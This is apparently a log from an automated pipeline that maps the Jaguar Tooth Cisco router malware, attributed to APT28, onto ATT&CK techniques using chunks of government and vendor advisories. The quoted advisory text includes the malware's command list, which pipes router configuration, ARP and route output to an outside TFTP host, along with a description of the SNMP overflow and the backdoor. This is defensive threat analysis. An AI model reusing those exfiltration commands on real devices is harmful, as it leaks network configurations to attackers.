[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.')]
[2025-03-27 12:11:23,069 INFO] ++ Post-conditions computed for action: System Information Discovery as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.')]
[2025-03-27 12:11:27,252 INFO] ++ Indicators computed for action: System Information Discovery as used by the malware. The indicators are:
['The content contains " | 0 3   8 1   6 0   0 0   0 8 | ".', 'The content contains " | 2 4   0 2   0 0   0 1 | ".']
[2025-03-27 12:11:27,303 INFO] ++ Removed pre-condition: 
A Cisco IOS device is accessible.
, due to similarity with: 
The target device runs Cisco IOS software.
 (tensor([[0.7650]]))
[2025-03-27 12:11:27,386 INFO] ++ Removed pre-condition: 
A network connection exists between the malware and the target device.
, due to similarity with: 
The malware has established a connection to the target device.
 (tensor([[0.8452]]))
[2025-03-27 12:11:34,578 INFO] Processing step relative to tactic: collection
[2025-03-27 12:11:34,578 INFO] + Processing action: Automated Collection as used by the malware
[2025-03-27 12:11:36,100 INFO] ++ Embedding computed for: Automated Collection as used by the malware. The vector has shape: (384,)
[2025-03-27 12:11:36,115 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle]: tensor([[0.3380]])
[2025-03-27 12:11:36,127 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: llmnr/nbt-ns poisoning and smb relay]: tensor([[0.2536]])
[2025-03-27 12:11:36,139 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: arp cache poisoning]: tensor([[0.2990]])
[2025-03-27 12:11:36,153 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: dhcp spoofing]: tensor([[0.2853]])
[2025-03-27 12:11:36,169 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: evil twin]: tensor([[0.3091]])
[2025-03-27 12:11:36,181 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data]: tensor([[0.3108]])
[2025-03-27 12:11:36,191 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via utility]: tensor([[0.3173]])
[2025-03-27 12:11:36,203 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via library]: tensor([[0.2637]])
[2025-03-27 12:11:36,214 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via custom method]: tensor([[0.2938]])
[2025-03-27 12:11:36,234 INFO] ++ Similarity between [Automated Collection as used by the malware] and [audio capture]: tensor([[0.2272]])
[2025-03-27 12:11:36,250 INFO] ++ Similarity between [Automated Collection as used by the malware] and [automated collection]: tensor([[0.4842]])
[2025-03-27 12:11:36,274 INFO] ++ Similarity between [Automated Collection as used by the malware] and [browser session hijacking]: tensor([[0.2898]])
[2025-03-27 12:11:36,287 INFO] ++ Similarity between [Automated Collection as used by the malware] and [clipboard data]: tensor([[0.3131]])
[2025-03-27 12:11:36,301 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from cloud storage]: tensor([[0.2087]])
[2025-03-27 12:11:36,314 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository]: tensor([[0.1970]])
[2025-03-27 12:11:36,325 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository: snmp (mib dump)]: tensor([[0.2218]])
[2025-03-27 12:11:36,339 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository: network device configuration dump]: tensor([[0.3200]])
[2025-03-27 12:11:36,356 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories]: tensor([[0.1751]])
[2025-03-27 12:11:36,368 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: confluence]: tensor([[0.1540]])
[2025-03-27 12:11:36,379 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: sharepoint]: tensor([[0.1849]])
[2025-03-27 12:11:36,393 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: code repositories]: tensor([[0.1451]])
[2025-03-27 12:11:36,405 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: customer relationship management software]: tensor([[0.0990]])
[2025-03-27 12:11:36,417 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: messaging applications]: tensor([[0.2254]])
[2025-03-27 12:11:36,427 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from local system]: tensor([[0.3820]])
[2025-03-27 12:11:36,440 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from network shared drive]: tensor([[0.3570]])
[2025-03-27 12:11:36,453 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from removable media]: tensor([[0.3537]])
[2025-03-27 12:11:36,464 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged]: tensor([[0.2202]])
[2025-03-27 12:11:36,476 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged: local data staging]: tensor([[0.1941]])
[2025-03-27 12:11:36,487 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged: remote data staging]: tensor([[0.1866]])
[2025-03-27 12:11:36,499 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection]: tensor([[0.2011]])
[2025-03-27 12:11:36,510 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: local email collection]: tensor([[0.2388]])
[2025-03-27 12:11:36,523 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: remote email collection]: tensor([[0.2011]])
[2025-03-27 12:11:36,542 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: email forwarding rule]: tensor([[0.1915]])
[2025-03-27 12:11:36,556 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture]: tensor([[0.2758]])
[2025-03-27 12:11:36,573 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: keylogging]: tensor([[0.2949]])
[2025-03-27 12:11:36,587 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: gui input capture]: tensor([[0.3388]])
[2025-03-27 12:11:36,606 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: web portal capture]: tensor([[0.3554]])
[2025-03-27 12:11:36,618 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: credential api hooking]: tensor([[0.3160]])
[2025-03-27 12:11:36,632 INFO] ++ Similarity between [Automated Collection as used by the malware] and [screen capture]: tensor([[0.2683]])
[2025-03-27 12:11:36,645 INFO] ++ Similarity between [Automated Collection as used by the malware] and [video capture]: tensor([[0.2197]])
[2025-03-27 12:11:36,646 INFO] ++ Scores: [('automated collection', tensor([[0.4842]])), ('data from local system', tensor([[0.3820]])), ('data from network shared drive', tensor([[0.3570]])), ('input capture: web portal capture', tensor([[0.3554]])), ('data from removable media', tensor([[0.3537]]))]
[2025-03-27 12:11:36,646 INFO] ++ Similar techniques found:
['automated collection', 'data from local system', 'data from network shared drive', 'input capture: web portal capture', 'data from removable media']
[2025-03-27 12:11:36,646 INFO] ++ Querying the QA model for action Automated Collection as used by the malware with the following context:
automated collection
data from local system
data from network shared drive
input capture: web portal capture
data from removable media
[2025-03-27 12:11:37,257 INFO] ++ QA suggested technique: data from local system
[2025-03-27 12:11:37,258 INFO] ++ Selected technique: data from local system
[2025-03-27 12:11:41,367 INFO] ++ Refining the action: Automated Collection as used by the malware using 9 documents:
[Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report.")]
[2025-03-27 12:12:11,362 INFO] ++ Pre-conditions computed for action: Automated Collection as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.')]
[2025-03-27 12:12:25,800 INFO] ++ Post-conditions computed for action: Automated Collection as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.')]
[2025-03-27 12:12:30,677 INFO] ++ Indicators computed for action: Automated Collection as used by the malware. The indicators are:
['The content contains " | 0 3   8 1   6 0   0 0   0 8 | ".', 'The content contains " | 2 4   0 2   0 0   0 1 | ".']
[2025-03-27 12:12:30,737 INFO] ++ Removed pre-condition: 
